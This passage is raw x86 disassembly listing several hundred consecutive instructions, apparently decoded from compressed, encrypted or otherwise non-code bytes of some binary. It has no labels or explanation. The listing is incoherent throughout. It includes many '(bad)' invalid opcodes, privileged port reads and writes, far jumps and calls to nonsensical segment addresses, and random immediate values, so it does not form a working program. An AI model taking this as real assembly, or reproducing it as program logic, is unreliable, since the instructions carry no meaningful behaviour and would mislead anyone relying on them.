  406b63:	imul   ecx,DWORD PTR [eax],0x7a
  406b66:	sti    
  406b67:	lock pop ebx
  406b69:	dec    esi
  406b6a:	sub    ax,0x5552
  406b6e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406b70:	jae    0x406b50
  406b72:	xlat   BYTE PTR ds:[ebx]
  406b73:	in     al,0xe8
  406b75:	mov    ah,0xb9
  406b77:	inc    ebp
  406b78:	jecxz  0x406bf2
  406b7a:	adc    edx,DWORD PTR [esi]
  406b7c:	jae    0x406ba6
  406b7e:	pusha  
  406b7f:	add    bl,BYTE PTR [ecx-0x9]
  406b82:	dec    ebp
  406b83:	mov    esp,0xb5d52db9
  406b88:	mov    ds:0xe4b5b425,al
  406b8d:	(bad)  
  406b8e:	pop    esp
  406b8f:	ror    BYTE PTR [ecx],1
  406b91:	or     eax,0x3b2e0853
  406b96:	or     dl,ch
  406b98:	out    dx,al
  406b99:	and    ecx,0xffffffec
  406b9c:	xlat   BYTE PTR ds:[ebx]
  406b9d:	fidivr WORD PTR ds:0x7888e5c6
  406ba3:	(bad)  
  406ba5:	pop    edi
  406ba6:	out    dx,eax
  406ba7:	inc    ecx
  406ba8:	xchg   ebp,eax
  406ba9:	sar    BYTE PTR [eax-0x2410859b],cl
  406baf:	test   al,0xc1
  406bb1:	dec    esp
  406bb2:	push   esi
  406bb3:	imul   eax,esi,0x1fbae002
  406bb9:	lahf   
  406bba:	mov    bh,0x10
  406bbc:	movq   mm4,QWORD PTR [ecx+ebx*4+0x5f93e09b]
  406bc4:	stos   BYTE PTR es:[edi],al
  406bc5:	dec    ebx
  406bc6:	or     al,0xf3
  406bc8:	mov    bl,0xac
  406bca:	jge    0x406ba0
  406bcc:	dec    esp
  406bcd:	imul   eax,DWORD PTR [eax],0xffffffd7
  406bd0:	test   BYTE PTR [esi+0x20c8450],ch
  406bd6:	xchg   ebp,eax
  406bd7:	packssdw mm3,mm7
  406bda:	imul   esp,DWORD PTR [eax+0x5acf7bc7],0xffffff81
  406be1:	add    eax,0x7aa436f2
  406be6:	(bad)  
  406be8:	aas    
  406be9:	fstp   TBYTE PTR [eax]
  406beb:	cmp    ecx,esp
  406bed:	sub    edx,ecx
  406bef:	xchg   DWORD PTR [ebp+0x4e670939],esp
  406bf5:	add    ebp,ecx
  406bf7:	sub    edx,DWORD PTR [edx]
  406bf9:	or     cl,bl
  406bfb:	pop    eax
  406bfc:	into   
  406bfd:	xchg   ebp,eax
  406bfe:	add    eax,0xb0300da1
  406c03:	xor    ah,ah
  406c05:	push   esp
  406c06:	mov    bl,0x3c
  406c08:	outs   dx,DWORD PTR ds:[esi]
  406c09:	(bad)  
  406c0a:	nop
  406c0b:	dec    BYTE PTR ds:0x4ed9c21f
  406c11:	out    0x98,al
  406c13:	jae    0x406bcd
  406c15:	mov    ah,0xb9
  406c17:	adc    al,bl
  406c19:	les    ecx,FWORD PTR [esi+edi*2-0x7f010d50]
  406c20:	xchg   ebp,eax
  406c21:	sub    ebx,DWORD PTR ds:[edx]
  406c24:	push   cs
  406c25:	ret    
  406c26:	mov    ebp,0xa240aa8c
  406c2b:	arpl   WORD PTR [esp+eax*1+0x5573ec1a],bp
  406c32:	xor    edx,DWORD PTR [edi+0x49bcba4]
  406c38:	xor    eax,0x4dc4a70b
  406c3d:	cmp    eax,0x5a3758b4
  406c42:	cmp    eax,DWORD PTR [edx-0x6d]
  406c45:	xchg   ebx,eax
  406c46:	sub    BYTE PTR [esi+0x2f6cd32c],al
  406c4c:	in     eax,dx
  406c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c4e:	dec    ebp
  406c4f:	mov    al,0x49
  406c51:	or     DWORD PTR [edi+0x54],0x7a21c819
  406c58:	inc    eax
  406c59:	aaa    
  406c5a:	add    eax,0xd221073
  406c5f:	and    eax,0x42dcf54
  406c64:	inc    ecx
  406c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c66:	or     eax,DWORD PTR [esi+ebp*1-0x14e2e14f]
  406c6d:	mov    dh,0x91
  406c6f:	pop    ecx
  406c70:	loop   0x406c61
  406c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c73:	mov    WORD PTR [ebp-0x33ef2b1c],gs
  406c79:	cmp    eax,0xd8ce345e
  406c7e:	sbb    esp,ebp
  406c80:	inc    edi
  406c81:	inc    esi
  406c82:	pop    esi
  406c83:	and    DWORD PTR [eax],esi
  406c85:	adc    dh,BYTE PTR [eax+0x182a0726]
  406c8b:	rcr    BYTE PTR [ebp+0x3947d0f6],1
  406c91:	imul   ebx,DWORD PTR [edi],0x4e22ebb3
  406c97:	jne    0x406cfd
  406c99:	adc    al,0xd5
  406c9b:	push   eax
  406c9c:	enter  0x1cea,0x17
  406ca0:	mov    ds:0x10c7821d,al
  406ca5:	test   eax,0x3563772e
  406caa:	pop    ss
  406cab:	bound  esi,QWORD PTR [edi+0x76]
  406cae:	cwde   
  406caf:	sbb    dh,BYTE PTR [edi+0x52]
  406cb2:	pop    es
  406cb3:	test   BYTE PTR [eax],ah
  406cb5:	mov    esi,DWORD PTR [edi-0x2619458f]
  406cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cbc:	adc    esp,edx
  406cbe:	stos   DWORD PTR es:[edi],eax
  406cbf:	mov    ah,bh
  406cc1:	mov    al,ds:0xab6a0ffe
  406cc6:	in     al,0xd3
  406cc8:	sbb    eax,0x4fbd28a4
  406ccd:	daa    
  406cce:	push   0x4338a074
  406cd3:	jp     0x406d09
  406cd5:	fisub  WORD PTR ds:0x9f301cf2
  406cdb:	xor    cl,BYTE PTR [esi+0x20]
  406cde:	(bad)  
  406cdf:	fdivrp st(3),st
  406ce1:	shr    DWORD PTR ds:0x5c92edcc,0x45
  406ce8:	push   eax
  406ce9:	or     dl,BYTE PTR [ecx+0x540ef400]
  406cef:	popf   
  406cf0:	sbb    al,0xd7
  406cf2:	jns    0x406d5c
  406cf4:	jb     0x406ce2
  406cf6:	push   cs
  406cf7:	test   al,0xaa
  406cf9:	xchg   ebx,eax
  406cfa:	(bad)  
  406cfb:	mov    BYTE PTR [ecx],cl
  406cfd:	push   0x77f31cb7
  406d02:	(bad)  
  406d04:	(bad)  
  406d05:	stc    
  406d06:	in     eax,dx
  406d07:	sub    edi,edi
  406d09:	or     dh,ah
  406d0b:	adc    cl,BYTE PTR [ecx+0x2926d4dc]
  406d11:	loope  0x406d42
  406d13:	test   DWORD PTR [ebp+0x83ee07],edx
  406d19:	call   0xce63405c
  406d1e:	xchg   edi,eax
  406d1f:	scas   eax,DWORD PTR es:[edi]
  406d20:	les    edi,FWORD PTR fs:[ebx-0x23]
  406d24:	mov    esp,0xcde70543
  406d29:	sbb    eax,0x8da5cab5
  406d2e:	inc    edi
  406d2f:	call   0x60f2:0xdd544c14
  406d36:	(bad)  
  406d37:	gs sub al,0x5e
  406d3a:	fidiv  DWORD PTR [edx+0x46]
  406d3d:	jbe    0x406d32
  406d3f:	dec    ebp
  406d40:	aam    0xe7
  406d42:	dec    esp
  406d43:	aam    0x79
  406d45:	add    edx,DWORD PTR [ecx-0x7]
  406d48:	test   al,0x71
  406d4a:	cmc    
  406d4b:	leave  
  406d4c:	xor    DWORD PTR [ebp-0x6],edi
  406d4f:	das    
  406d50:	xchg   esp,eax
  406d51:	lods   eax,DWORD PTR ds:[esi]
  406d52:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  406d54:	xor    bl,dh
  406d56:	sub    DWORD PTR [edi+0x9caffbb],0xc5eef579
  406d60:	aam    0x3b
  406d62:	ja     0x406d05
  406d64:	mov    al,ds:0x58639bc0
  406d69:	sbb    BYTE PTR [ecx+edx*4-0x30],cl
  406d6d:	jae    0x406d0d
  406d6f:	rcr    DWORD PTR [esi],0x3d
  406d72:	xor    eax,0xb3732d6f
  406d77:	call   0x9474:0xae96ecc8
  406d7e:	jge    0x406d8d
  406d80:	mov    al,0xa1
  406d82:	cmp    al,0x47
  406d84:	mov    ds:0x3679ced4,eax
  406d89:	pop    edx
  406d8a:	imul   ebx,DWORD PTR [ecx+0x1e],0xa33c017
  406d91:	lahf   
  406d92:	xchg   ebx,eax
  406d93:	popa   
  406d94:	inc    esi
  406d95:	in     eax,0xda
  406d97:	lods   al,BYTE PTR ds:[esi]
  406d98:	inc    esp
  406d99:	test   al,0x4f
  406d9b:	mov    dh,0x9f
  406d9d:	lock mov bh,0x26
  406da0:	les    edi,FWORD PTR [ebx+0x62]
  406da3:	dec    esp
  406da4:	mov    bh,0x78
  406da6:	push   ecx
  406da7:	and    BYTE PTR [eax-0x49f184a1],cl
  406dad:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  406daf:	and    BYTE PTR [ebx+0x0],dl
  406db2:	xchg   DWORD PTR [ecx],edi
  406db4:	mov    ss,ecx
  406db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db7:	sub    BYTE PTR [ebp+0x5f77f3fd],bh
  406dbd:	fmul   st(5),st
  406dbf:	and    BYTE PTR [eax+0x6e],al
  406dc2:	ja     0x406e2d
  406dc4:	dec    ecx
  406dc5:	sahf   
  406dc6:	or     esi,esp
  406dc8:	sbb    al,0x19
  406dca:	popa   
  406dcb:	mov    bl,0x38
  406dcd:	mov    cl,0xf2
  406dcf:	outs   dx,DWORD PTR ds:[esi]
  406dd0:	or     BYTE PTR [ecx+ebp*8],dl
  406dd3:	gs aaa 
  406dd5:	jae    0x406ded
  406dd7:	aad    0x64
  406dd9:	or     al,0x7b
  406ddb:	cli    
  406ddc:	dec    eax
  406ddd:	cdq    
  406dde:	push   ebx
  406ddf:	sub    dh,BYTE PTR [ebp+0x180ce5b0]
  406de5:	xchg   edi,eax
  406de6:	sbb    BYTE PTR [esi-0x6ebc5806],0xa7
  406ded:	lods   al,BYTE PTR ds:[esi]
  406dee:	xchg   esp,eax
  406def:	inc    ebp
  406df0:	repz inc ebx
  406df2:	ret    0x4aa6
  406df5:	ror    BYTE PTR [edi],0xc3
  406df8:	jb     0x406df2
  406dfa:	jnp    0x406e6d
  406dfc:	aad    0x18
  406dfe:	scas   al,BYTE PTR es:[edi]
  406dff:	mov    cs,WORD PTR ds:0x1cdd596b
  406e05:	inc    esi
  406e06:	mov    al,0x6c
  406e08:	out    0x59,al
  406e0a:	cmp    ah,dl
  406e0c:	xor    edx,esi
  406e0e:	xlat   BYTE PTR gs:[ebx]
  406e10:	inc    ebp
  406e11:	mov    bh,0x75
  406e13:	jo     0x406e8c
  406e15:	mov    dl,0xcb
  406e17:	loopne 0x406df6
  406e19:	rcpps  xmm7,xmm2
  406e1c:	lods   al,BYTE PTR ds:[esi]
  406e1d:	sahf   
  406e1e:	xlat   BYTE PTR ds:[ebx]
  406e1f:	pop    ecx
  406e20:	jae    0x406e61
  406e22:	sbb    al,0xf6
  406e24:	mov    edi,0x21a1fbb6
  406e29:	pop    eax
  406e2a:	clc    
  406e2b:	cwde   
  406e2c:	pop    ecx
  406e2d:	push   cs
  406e2e:	push   esp
  406e2f:	aaa    
  406e30:	add    DWORD PTR [ebp-0xde0f922],esp
  406e36:	adc    DWORD PTR [ecx],edi
  406e38:	pop    ebx
  406e39:	jge    0x406e12
  406e3b:	sub    al,0x74
  406e3d:	xor    al,0x8f
  406e3f:	pop    edx
  406e40:	lods   eax,DWORD PTR ds:[esi]
  406e41:	sbb    BYTE PTR [esi],bl
  406e43:	or     eax,0x8ef10b69
  406e48:	jp     0x406e0b
  406e4a:	mov    WORD PTR [ebx+eax*4],ds
  406e4d:	faddp  st(1),st
  406e4f:	and    edi,DWORD PTR [ebp+0x54c6f1d8]
  406e55:	frstor [eax]
  406e57:	loopne 0x406dee
  406e59:	cld    
  406e5a:	mov    al,ds:0xa80738c4
  406e5f:	aaa    
  406e60:	or     ecx,DWORD PTR [edi-0x57]
  406e63:	add    eax,0x285e9336
  406e68:	pop    ebx
  406e69:	pop    eax
  406e6a:	dec    edx
  406e6b:	mov    eax,0xea787bd9
  406e70:	pop    ebx
  406e71:	push   edi
  406e72:	jns    0x406ecf
  406e74:	aaa    
  406e75:	lea    ebp,[edi]
  406e77:	sub    al,bh
  406e79:	jmp    0xf331:0x61f8125f
  406e80:	mov    dl,0xca
  406e82:	retf   
  406e83:	frstor [edx]
  406e85:	fistp  DWORD PTR [edi+0x4f9a4d9e]
  406e8b:	xchg   ebp,eax
  406e8c:	add    ch,BYTE PTR [eax]
  406e8e:	sbb    DWORD PTR [edx+0x72],ebx
  406e91:	in     eax,dx
  406e92:	test   BYTE PTR [edx+ebx*8],0x36
  406e96:	jmp    0x82835207
  406e9b:	test   al,0x1
  406e9d:	mov    dl,0x33
  406e9f:	je     0x406f19
  406ea1:	in     eax,dx
  406ea2:	addr16 cmc 
  406ea4:	test   eax,0x6c08850d
  406ea9:	pusha  
  406eaa:	pusha  
  406eab:	sbb    bl,ch
  406ead:	cmc    
  406eae:	out    0x76,al
  406eb0:	adc    ch,BYTE PTR [esi-0xd46d491]
  406eb6:	imul   esi,DWORD PTR [edx+eax*2],0x46
  406eba:	push   es
  406ebb:	neg    BYTE PTR [edx-0x10251174]
  406ec1:	mov    dh,0xde
  406ec3:	or     bl,0xeb
  406ec6:	or     eax,0x854ca805
  406ecb:	imul   BYTE PTR [ecx-0x7a]
  406ece:	out    dx,al
  406ecf:	sub    bh,BYTE PTR [esi+0x2d0f11b2]
  406ed5:	(bad)  
  406ed6:	jno    0x406edc
  406ed8:	addr16 inc ebx
  406eda:	dec    edx
  406edb:	arpl   WORD PTR [eax-0x6a],cx
  406ede:	dec    ebp
  406edf:	rcl    BYTE PTR [ecx+0x1d8ed29d],1
  406ee5:	and    edx,DWORD PTR [ebx+0x446eef47]
  406eeb:	out    0x57,al
  406eed:	push   cs
  406eee:	push   ecx
  406eef:	neg    ch
  406ef1:	inc    edi
  406ef2:	dec    esp
  406ef3:	or     DWORD PTR ss:[ebp+0x444f8234],0x7c
  406efb:	stos   BYTE PTR es:[edi],al
  406efc:	mov    edx,0x7e8deb44
  406f01:	push   ss
  406f02:	daa    
  406f03:	lahf   
  406f04:	sbb    ch,dh
  406f06:	imul   edi,esp,0x6d446d87
  406f0c:	pushf  
  406f0d:	mov    al,ds:0x7b1b559d
  406f12:	(bad)  
  406f13:	mov    dl,0x1a
  406f15:	or     al,0x61
  406f17:	cli    
  406f18:	sub    al,0xea
  406f1a:	imul   ecx,DWORD PTR [esi-0x27bd294a],0xfffffffd
  406f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f22:	aas    
  406f23:	test   al,0xc1
  406f25:	mov    ebp,0x478457a2
  406f2a:	jo     0x406ee3
  406f2c:	and    eax,esp
  406f2e:	sub    al,0xb0
  406f30:	sbb    al,0xf7
  406f32:	push   ebx
  406f33:	aaa    
  406f34:	aad    0xe7
  406f36:	in     al,dx
  406f37:	xor    esi,ebp
  406f39:	push   edi
  406f3a:	push   ebp
  406f3b:	popf   
  406f3c:	shr    BYTE PTR [ebx],0xdf
  406f3f:	dec    ecx
  406f40:	xlat   BYTE PTR ds:[ebx]
  406f41:	jecxz  0x406f32
  406f43:	pop    ss
  406f44:	mov    ds:0xc877da6e,al
  406f49:	lods   al,BYTE PTR ds:[esi]
  406f4a:	add    ebx,DWORD PTR [ebp+0x194f6d34]
  406f50:	sub    eax,0xb6a40333
  406f55:	sub    esi,DWORD PTR ss:[eax+esi*1+0x7b]
  406f5a:	lock pop eax
  406f5c:	xchg   edx,eax
  406f5d:	xchg   BYTE PTR [edx+0x70],ah
  406f60:	push   cs
  406f61:	out    dx,al
  406f62:	(bad)  
  406f63:	fwait
  406f64:	push   ebp
  406f65:	sbb    ch,BYTE PTR [ecx+ebp*1-0x39498ce2]
  406f6c:	ins    BYTE PTR es:[edi],dx
  406f6d:	add    esi,DWORD PTR [ebx]
  406f6f:	or     BYTE PTR [ebx],dl
  406f71:	dec    ebx
  406f72:	or     ebp,DWORD PTR es:[ebx+0x3cb81f1e]
  406f79:	pop    ecx
  406f7a:	loopne 0x406f37
  406f7c:	fnstsw WORD PTR [edx+0x43]
  406f7f:	cmp    eax,0x2db7b621
  406f84:	sbb    al,0x1a
  406f86:	inc    eax
  406f87:	add    al,0x90
  406f89:	popa   
  406f8a:	push   es
  406f8b:	inc    edx
  406f8c:	icebp  
  406f8d:	inc    edi
  406f8e:	add    eax,0x62a8110e
  406f93:	mov    eax,ds:0x1cb83659
  406f98:	retf   0x5c85
  406f9b:	enter  0x27cb,0x29
  406f9f:	pop    ebx
  406fa0:	lds    ecx,FWORD PTR [edx]
  406fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fa3:	pusha  
  406fa4:	mov    cl,0x92
  406fa6:	sbb    ebx,eax
  406fa8:	js     0x406fa7
  406faa:	out    0x94,eax
  406fac:	push   0xffffffe2
  406fae:	ja     0x406fe1
  406fb0:	cli    
  406fb1:	int3   
  406fb2:	push   esp
  406fb3:	push   0x7b7c521c
  406fb8:	(bad)  
  406fb9:	lods   al,BYTE PTR ds:[esi]
  406fba:	call   0x872a3783
  406fbf:	mov    esp,0x7e9e6112
  406fc4:	mov    dl,BYTE PTR [ebp-0x234e1603]
  406fca:	pop    esp
  406fcb:	push   ecx
  406fcc:	mov    ds:0xbbd2820c,eax
  406fd1:	push   edx
  406fd2:	xchg   ecx,eax
  406fd3:	data16 mov gs,WORD PTR [ecx+0x750e0eb1]
  406fda:	js     0x406fc0
  406fdc:	jnp    0x406f96
  406fde:	dec    ebp
  406fdf:	repz jo 0x406fd7
  406fe2:	inc    ecx
  406fe3:	out    dx,al
  406fe4:	cmp    bh,0x7
  406fe7:	dec    ebp
  406fe8:	(bad)  
  406fea:	jmp    0x9f041280
  406fef:	pusha  
  406ff0:	ins    BYTE PTR es:[edi],dx
  406ff1:	mov    ds:0xc18241ba,al
  406ff6:	xchg   ebx,eax
  406ff7:	mov    ebx,0xddb3ac69
  406ffc:	add    dh,cl
  406ffe:	push   ecx
  406fff:	in     eax,dx
  407000:	mov    bh,0x19
  407002:	inc    edi
  407003:	fst    QWORD PTR [edi]
  407005:	ja     0x407036
  407007:	cli    
  407008:	push   0x5ef3c371
  40700d:	sbb    ebx,DWORD PTR [eax+ecx*1]
  407010:	cdq    
  407011:	mov    dh,0x84
  407013:	inc    esp
  407014:	(bad)  
  407015:	jg     0x407056
  407017:	int3   
  407018:	popa   
  407019:	push   ebx
  40701a:	sub    DWORD PTR [esi-0xe],ebx
  40701d:	xor    eax,0x3150d338
  407022:	mov    ds:0x6f97b7ff,al
  407027:	js     0x407024
  407029:	sahf   
  40702a:	xor    eax,0xdaaffe47
  40702f:	push   ss
  407030:	shl    ah,0xcd
  407033:	and    eax,0x5f0bb6a0
  407038:	div    BYTE PTR [eax-0x423e087b]
  40703e:	loopne 0x407097
  407040:	dec    esi
  407041:	aad    0xca
  407043:	(bad)  
  407044:	mov    ch,0xd2
  407046:	dec    edx
  407047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407048:	mov    WORD PTR [edx],cs
  40704a:	leave  
  40704b:	sahf   
  40704c:	and    esi,DWORD PTR [ebx]
  40704e:	rcl    DWORD PTR [edx-0x3e057f63],0x8
  407055:	enter  0x844c,0x2b
  407059:	loope  0x40709b
  40705b:	daa    
  40705c:	aas    
  40705d:	adc    eax,0x688efa5c
  407062:	sti    
  407063:	mov    cl,0x1e
  407065:	dec    ebx
  407066:	inc    esp
  407067:	inc    esi
  407068:	nop
  407069:	xor    edi,DWORD PTR [ecx]
  40706b:	in     eax,0xe5
  40706d:	mov    ch,0x82
  40706f:	or     ecx,DWORD PTR [eax]
  407071:	fst    st(6)
  407073:	adc    eax,0x9d9ff33c
  407078:	jmp    0x1b26:0x3b16ae8f
  40707f:	add    eax,ebx
  407081:	xchg   BYTE PTR [ebx-0x1b],ah
  407084:	mov    al,ds:0x98507045
  407089:	pop    ebx
  40708a:	adc    al,0x21
  40708c:	or     edx,DWORD PTR [esi]
  40708e:	push   ss
  40708f:	mov    edi,0x57cc5d52
  407094:	cwde   
  407095:	xor    al,0xee
  407097:	rcl    DWORD PTR [ebx],0xb0
  40709a:	and    ah,BYTE PTR [ecx+0x1b4f8a5e]
  4070a0:	inc    eax
  4070a1:	sti    
  4070a2:	xchg   esi,eax
  4070a3:	unpckhps xmm4,XMMWORD PTR [ebx-0xc]
  4070a7:	pop    eax
  4070a8:	fld    DWORD PTR [edi+0x55196549]
  4070ae:	xor    DWORD PTR es:[eax-0x7b347f5c],0x9124968a
  4070b9:	mov    es,WORD PTR [edi+0x316d8bf5]
  4070bf:	push   edx
  4070c0:	rol    BYTE PTR [ebx-0x36],cl
  4070c3:	jno    0x40710f
  4070c5:	mov    ebx,0x3f9da906
  4070ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070cb:	gs sbb eax,0xea01132f
  4070d1:	sub    eax,0x98910fda
  4070d6:	mov    eax,0x7c2e1e21
  4070db:	iret   
  4070dc:	fldcw  WORD PTR [ebp+0x2f6acc2]
  4070e2:	je     0x4070ca
  4070e4:	mov    dl,0x56
  4070e6:	xchg   ebp,eax
  4070e7:	cmp    eax,0x671a23cf
  4070ec:	stos   DWORD PTR es:[edi],eax
  4070ed:	(bad)  
  4070ee:	rcr    DWORD PTR [ebx],0xe2
  4070f1:	scas   eax,DWORD PTR es:[edi]
  4070f2:	popf   
  4070f3:	aaa    
  4070f4:	ror    cl,cl
  4070f6:	test   ebx,0x28e9fc28
  4070fc:	out    dx,eax
  4070fd:	sbb    al,0x99
  4070ff:	sbb    al,0xfa
  407101:	pop    ecx
  407102:	mov    esi,0xef6f2e2c
  407107:	jae    0x40716c
  407109:	xchg   ecx,eax
  40710a:	repz lea ebx,[edx-0x223acfc5]
  407111:	imul   edx,DWORD PTR [eax-0x61],0x19
  407115:	fdiv   st,st(5)
  407117:	xor    eax,0x43d594e0
  40711c:	push   cs
  40711d:	popf   
  40711e:	mov    WORD PTR [esi-0x75c3b250],gs
  407124:	outs   dx,DWORD PTR ds:[esi]
  407125:	rcr    DWORD PTR [ebx+0x1eb7d24f],1
  40712b:	ins    DWORD PTR es:[edi],dx
  40712c:	test   al,0x6e
  40712e:	fcom   DWORD PTR [edi-0x561d4ff5]
  407134:	mov    edx,0x82297201
  407139:	inc    edi
  40713a:	jmp    0x407119
  40713c:	cdq    
  40713d:	lds    eax,FWORD PTR [ebx+0x4d]
  407140:	arpl   ax,si
  407142:	(bad)  
  407143:	pop    ebx
  407144:	bound  ecx,QWORD PTR [edi]
  407146:	(bad)  
  407147:	bound  esp,QWORD PTR [esi+eax*2+0x2f15b4c1]
  40714e:	call   0xa1dd:0x3002335a
  407155:	push   0xda3d33f2
  40715a:	xor    esp,DWORD PTR [ebx+0x7a]
  40715d:	sti    
  40715e:	(bad)  
  40715f:	sub    DWORD PTR [edi+esi*2+0x3b],ebp
  407163:	xchg   DWORD PTR [edi+0x341cb204],edx
  407169:	jle    0x4070eb
  40716b:	and    al,0x58
  40716d:	xchg   esp,eax
  40716e:	mov    dh,0x90
  407170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407171:	pop    esp
  407172:	sbb    bh,BYTE PTR [eax+0x19b39b0e]
  407178:	mov    esi,0x482bae1
  40717d:	dec    esp
  40717e:	cli    
  40717f:	mov    dh,0x2f
  407181:	adc    eax,0xc7755887
  407186:	je     0x4071be
  407188:	sub    al,0xbc
  40718a:	push   eax
  40718b:	sub    dh,BYTE PTR [ebx-0x5818b90d]
  407191:	std    
  407192:	mov    ah,0x44
  407194:	push   ecx
  407195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407196:	psubsb mm5,QWORD PTR [edi]
  407199:	mov    cl,0xdd
  40719b:	and    DWORD PTR [edi-0xa5e52fe],0xffffffef
  4071a2:	jmp    0x2c309713
  4071a7:	in     al,dx
  4071a8:	loop   0x407170
  4071aa:	lds    ebx,FWORD PTR [edi-0x5]
  4071ad:	daa    
  4071ae:	lea    eax,[edi+0x377f2365]
  4071b4:	mov    eax,0x4773e526
  4071b9:	jo     0x407166
  4071bb:	push   eax
  4071bc:	mov    esi,0x23b0bcba
  4071c1:	jg     0x4071e2
  4071c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071c4:	xor    BYTE PTR [edx],dl
  4071c6:	imul   esp,esp,0x38
  4071c9:	pop    es
  4071ca:	cmc    
  4071cb:	mov    esp,0x1c41308d
  4071d0:	call   0x3720ff39
  4071d5:	dec    ebx
  4071d6:	in     al,dx
  4071d7:	mov    dl,BYTE PTR [ebx]
  4071d9:	inc    edx
  4071da:	sub    eax,0x10893b69
  4071df:	sub    esi,esi
  4071e1:	jnp    0x407197
  4071e3:	mov    cl,0xfe
  4071e5:	sub    DWORD PTR [ebp+0x2bb79694],ebx
  4071eb:	jns    0x4071cc
  4071ed:	add    BYTE PTR [ecx+eax*8-0x48d91320],0x23
  4071f5:	push   ss
  4071f6:	xchg   ecx,eax
  4071f7:	jne    0x407227
  4071f9:	pop    ebp
  4071fa:	mov    dl,0xcb
  4071fc:	adc    bl,bl
  4071fe:	(bad)  
  4071ff:	fstp   TBYTE PTR [ebp+0x3e]
  407202:	or     al,0xfa
  407204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407205:	dec    eax
  407206:	jecxz  0x4071e6
  407208:	cs mov esp,0x1acc2364
  40720e:	pushf  
  40720f:	repnz pop esi
  407211:	cmp    al,0x92
  407213:	push   ebp
  407214:	clc    
  407215:	repnz ffree st(3)
  407218:	xor    al,0xc6
  40721a:	imul   esp,DWORD PTR [esi+ebp*8+0x1bcf7765],0x280eb161
  407225:	into   
  407226:	sbb    dh,bl
  407228:	dec    esi
  407229:	mov    BYTE PTR [ebp+0x5d],al
  40722c:	xor    eax,0xbd16f105
  407231:	inc    eax
  407232:	push   ss
  407233:	push   ecx
  407234:	setl   BYTE PTR [ebx]
  407237:	outs   dx,BYTE PTR ds:[esi]
  407238:	xlat   BYTE PTR ds:[ebx]
  407239:	inc    ebx
  40723a:	add    BYTE PTR [edi],ah
  40723c:	push   ebx
  40723d:	imul   edi,DWORD PTR [eax],0xffffffaf
  407240:	push   ecx
  407241:	inc    eax
  407242:	inc    ebx
  407243:	push   esp
  407244:	into   
  407245:	lods   eax,DWORD PTR ds:[esi]
  407246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407247:	sub    edx,0xffffff82
  40724a:	jmp    0xd4f2:0x697a5240
  407251:	cmp    ah,BYTE PTR [ebx-0x1e]
  407254:	cmp    BYTE PTR [ecx-0xe],bl
  407257:	loope  0x4071f2
  407259:	push   es
  40725a:	outs   dx,BYTE PTR ds:[esi]
  40725b:	xchg   edx,eax
  40725c:	mov    eax,0x561e06c2
  407261:	pusha  
  407262:	or     dh,BYTE PTR [esi-0x151022ee]
  407268:	lea    esp,[edi]
  40726a:	inc    eax
  40726b:	in     al,0x8c
  40726d:	mov    edi,0xbe1c4e27
  407272:	sbb    al,0x93
  407274:	hlt    
  407275:	test   dh,bl
  407277:	mov    dh,0x38
  407279:	(bad)  
  40727a:	ss es dec ebx
  40727d:	mov    BYTE PTR [bx+di],al
  407280:	sbb    DWORD PTR [edx-0xb79e4ed],ebx
  407286:	xor    DWORD PTR [eax+0x43f257d4],esp
  40728c:	dec    eax
  40728d:	scas   eax,DWORD PTR es:[edi]
  40728e:	xor    BYTE PTR [edi+edi*8+0xe3be1a5],0x96
  407296:	push   0x40
  407298:	sbb    ecx,eax
  40729a:	push   ebx
  40729b:	mul    DWORD PTR [edi-0x573bb637]
  4072a1:	push   0x1ef6da5b
  4072a6:	push   edi
  4072a7:	(bad)  
  4072a8:	and    bh,dl
  4072aa:	mov    edi,0x4e130d2c
  4072af:	xor    eax,0xc2793816
  4072b4:	aaa    
  4072b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072b6:	sub    al,0xae
  4072b8:	cmp    al,0x2f
  4072ba:	rol    DWORD PTR [eax-0x5c],1
  4072bd:	sahf   
  4072be:	mov    ebp,0xe5edce7e
  4072c3:	int3   
  4072c4:	dec    ebx
  4072c5:	dec    ebp
  4072c6:	sahf   
  4072c7:	ins    DWORD PTR es:[edi],dx
  4072c8:	mov    cl,0xbb
  4072ca:	outs   dx,DWORD PTR ds:[esi]
  4072cb:	adc    eax,0xffffffb6
  4072ce:	cmp    eax,0x54155614
  4072d3:	pop    esp
  4072d4:	and    DWORD PTR [edi-0x19a7d8f1],ecx
  4072da:	xor    al,cl
  4072dc:	xor    eax,0x135c30cb
  4072e1:	mov    esp,0x17c4dcf6
  4072e6:	and    bl,ch
  4072e8:	sbb    esp,DWORD PTR ds:0xc35a78b1
  4072ee:	dec    ebp
  4072ef:	pop    ds
  4072f0:	dec    edi
  4072f1:	push   ebx
  4072f2:	lds    esp,FWORD PTR [edi+0x69cc0567]
  4072f8:	mov    es,WORD PTR [eax]
  4072fa:	cmp    al,0x30
  4072fc:	add    eax,0x601584ac
  407301:	fcmovnbe st,st(0)
  407303:	addr16 mov dh,0x93
  407306:	pop    ss
  407307:	cmp    ch,BYTE PTR [edi-0x73]
  40730a:	(bad)  
  40730b:	sub    DWORD PTR [ebx-0x73],edi
  40730e:	sbb    BYTE PTR [ebp+0x63],0x35
  407312:	pop    edi
  407313:	xchg   ebx,eax
  407314:	rcl    bh,1
  407316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407317:	ss enter 0xa887,0xe2
  40731c:	leave  
  40731d:	(bad)  
  40731e:	mov    ch,0x33
  407320:	sbb    edx,ebp
  407322:	(bad)  
  407324:	mov    al,ds:0xde291ae7
  407329:	aad    0x29
  40732b:	jae    0x407379
